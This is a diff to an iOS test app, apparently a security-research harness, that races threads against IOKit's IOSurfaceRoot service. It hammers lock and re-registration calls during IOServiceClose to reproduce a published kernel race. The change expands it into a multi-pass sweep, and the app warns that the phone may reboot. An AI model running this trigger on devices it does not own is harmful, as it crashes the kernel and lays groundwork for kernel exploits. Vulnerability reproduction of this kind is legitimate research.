@@ -131,7 +131,7 @@ static void *spamReg(void *arg) {
 // ---- variants ----
 // V_LOCKDEG: register, surface + 4 lock/unlock threads, jittered sleep, close, brief settle, stop, release.
 // The published hit case: hit at iteration 100 of 200.
-static int runLockdeg(int iter) {
+static int runLockdeg(int iter, int nth) {
   io_connect_t c = 0; mach_port_t wp = newWakePort();
   if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); return -100; }
   kern_return_t r = regAsync(c, wp);
@@ -140,34 +140,36 @@ static int runLockdeg(int iter) {
   if (!s) { IOServiceClose(c); dropPort(wp); return -102; }
   gRun = 1; gOps = 0;
   gOps++;  // the registration above counts as this case's first IOKit op
-  pthread_t th[4];
-  for (int i = 0; i < 4; i++) pthread_create(&th[i], NULL, spamLock, s);
-  usleep(200 + (iter % 40) * 25);
+  if (nth < 2) nth = 2; if (nth > 8) nth = 8;
+  pthread_t th[8];
+  for (int i = 0; i < nth; i++) pthread_create(&th[i], NULL, spamLock, s);
+  usleep(100 + (iter % 60) * 30);
   IOServiceClose(c);            // crash point per research
   gOps++;
   usleep(300);
   gRun = 0;
-  for (int i = 0; i < 4; i++) pthread_join(th[i], NULL);
+  for (int i = 0; i < nth; i++) pthread_join(th[i], NULL);
   CFRelease(s);                 // release only after close
   dropPort(wp);
   return 0;
 }
 // V_RACE1: register + 6 re-register spam threads, jittered sleep, close.
-static int runRace1(int iter) {
+static int runRace1(int iter, int nth) {
   io_connect_t c = 0; mach_port_t wp = newWakePort();
   if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); return -100; }
   kern_return_t r = regAsync(c, wp);
   if (r != KERN_SUCCESS) { L(@"race1 i%d reg rc=0x%x", iter, r); IOServiceClose(c); dropPort(wp); return (int)r; }
   gConn = c; gConnWp = wp; gRun = 1; gOps = 0;
   gOps++;  // the registration above counts as this case's first IOKit op
-  pthread_t th[6];
-  for (int i = 0; i < 6; i++) pthread_create(&th[i], NULL, spamReg, NULL);
-  usleep(150 + (iter % 50) * 20);
+  if (nth < 4) nth = 4; if (nth > 8) nth = 8;
+  pthread_t th[8];
+  for (int i = 0; i < nth; i++) pthread_create(&th[i], NULL, spamReg, NULL);
+  usleep(80 + (iter % 80) * 25);
   IOServiceClose(c);
   gOps++;
   usleep(700);
   gRun = 0;
-  for (int i = 0; i < 6; i++) pthread_join(th[i], NULL);
+  for (int i = 0; i < nth; i++) pthread_join(th[i], NULL);
   dropPort(wp);
   return 0;
 }
@@ -208,7 +210,9 @@ static void loadDone(void) {
   L(@"resume: %lu ends already on file", (unsigned long)gDone.count);
 }
 
-static const double kStartBudget = 100.0;   // seconds of case-running before wrapping up
+static const double kStartBudget = 300.0;   // seconds of sweep before wrapping up
+static volatile int gPass = 0;
+static const int kSweepPasses = 64;
 static void runAll(void) {
   CKPT(@"calib-start");
   // calibrate: sync must fail (0xE00002C2), async must succeed
@@ -230,24 +234,29 @@ static void runAll(void) {
     { 1, 100, "race1" },
   };
   int nplan = (int)(sizeof(plan) / sizeof(plan[0]));
-  for (int p = 0; p < nplan; p++) {
-    for (int i = 0; i < plan[p].it; i++) {
-      if (gStop || nowSec() > kStartBudget) {
-        noteEvent(@"budget", [NSString stringWithFormat:@",\"at\":\"%s-%d\",\"t\":%.2f", plan[p].tag, i, nowSec()]);
-        return;
-      }
-      NSString *key = [NSString stringWithFormat:@"%s-I%04d", plan[p].tag, i];
-      if ([gDone containsObject:key]) continue;
-      gPhase = plan[p].v;
-      beginCase(key);
-      gCaseRan++;
-      uint64_t t0 = nowNs();
-      int rc = 0;
-      @autoreleasepool {
-        if (plan[p].v == 0) rc = runLockdeg(i);
-        else if (plan[p].v == 1) rc = runRace1(i);
-        else rc = runPostclose(i);
-      }
+  for (gPass = 0; gPass < kSweepPasses; gPass++) {
+    noteEvent(@"pass", [NSString stringWithFormat:@",\"pass\":%d,\"lt\":%d,\"rt\":%d", gPass, 2 + (gPass % 5), 4 + (gPass % 5)]);
+    for (int p = 0; p < nplan; p++) {
+      int iterBase = gPass * 37;
+      int nth = (plan[p].v == 0) ? (2 + (gPass % 5)) : (plan[p].v == 1) ? (4 + (gPass % 5)) : 4;
+      for (int i = 0; i < plan[p].it; i++) {
+        if (gStop || nowSec() > kStartBudget) {
+          noteEvent(@"budget", [NSString stringWithFormat:@",\"pass\":%d,\"at\":\"%s-%d\",\"t\":%.2f", gPass, plan[p].tag, i, nowSec()]);
+          return;
+        }
+        NSString *key = [NSString stringWithFormat:@"P%03d-%s-I%04d", gPass, plan[p].tag, i];
+        if ([gDone containsObject:key]) continue;
+        gPhase = plan[p].v;
+        beginCase(key);
+        gCaseRan++;
+        uint64_t t0 = nowNs();
+        int rc = 0;
+        int jit = i + iterBase;
+        @autoreleasepool {
+          if (plan[p].v == 0) rc = runLockdeg(jit, nth);
+          else if (plan[p].v == 1) rc = runRace1(jit, nth);
+          else rc = runPostclose(i);
+        }
       uint64_t ms = (nowNs() - t0) / 1000000ull;
       endCase(key, [NSString stringWithFormat:@",\"v\":%d,\"i\":%d,\"rc\":%d,\"ms\":%llu,\"ops\":%llu",
                     plan[p].v, i, rc, (unsigned long long)ms, (unsigned long long)gOps]);
@@ -272,13 +281,13 @@ static void runAll(void) {
   // v3.3: fsync the Documents DIRECTORY once so the files' directory entries are durable across a kernel reset
   { int dfd = open([gDoc UTF8String], O_RDONLY); if (dfd >= 0) { fsync(dfd); close(dfd); } }
   CKPT(@"launch");
-  L(@"probe v3.3 start t=%.3f doc=%@", nowSec(), gDoc);
+  L(@"probe v3.4 sweep start t=%.3f doc=%@", nowSec(), gDoc);
   self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
   UIViewController *root = [UIViewController new];
   root.view.backgroundColor = [UIColor blackColor];
   CGRect b = UIScreen.mainScreen.bounds;
   UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(16, 80, b.size.width - 32, b.size.height - 160)];
-  lab.text = @"israce v3.3 ckpts\nreplicating the trigger\nphone may reboot if it hits";
+  lab.text = @"israce v3.4 sweep\n64 passes x 340 cases\nphone may reboot if it hits";
   lab.textColor = [UIColor greenColor];
   lab.numberOfLines = 0;
   lab.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightRegular];
@@ -309,9 +318,9 @@ static void runAll(void) {
       if (!gSvc) { noteEvent(@"abort", @",\"why\":\"no IOSurfaceRoot service\""); self.label.text = @"no IOSurfaceRoot service"; return; }
       runAll();
       if (!gStop) {
-        L(@"probe v3 END (survived all planned cases) ok=%d ends=%d", gOK, gEnds);
-        noteEvent(@"summary", [NSString stringWithFormat:@",\"ran\":%d,\"ends\":%d,\"ok\":%d,\"t\":%.2f", gCaseRan, gEnds, gOK, nowSec()]);
-        self.label.text = [NSString stringWithFormat:@"survived\nran %d ok %d\n%.1fs", gCaseRan, gOK, nowSec()];
+        L(@"probe v3 END (sweep done) passes=%d ok=%d ends=%d", gPass, gOK, gEnds);
+        noteEvent(@"summary", [NSString stringWithFormat:@",\"ran\":%d,\"ends\":%d,\"ok\":%d,\"passes\":%d,\"t\":%.2f", gCaseRan, gEnds, gOK, gPass, nowSec()]);
+        self.label.text = [NSString stringWithFormat:@"sweep done\n%d passes, ran %d ok %d\n%.1fs", gPass, gCaseRan, gOK, nowSec()];
         dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ exit(0); });
       }
     }
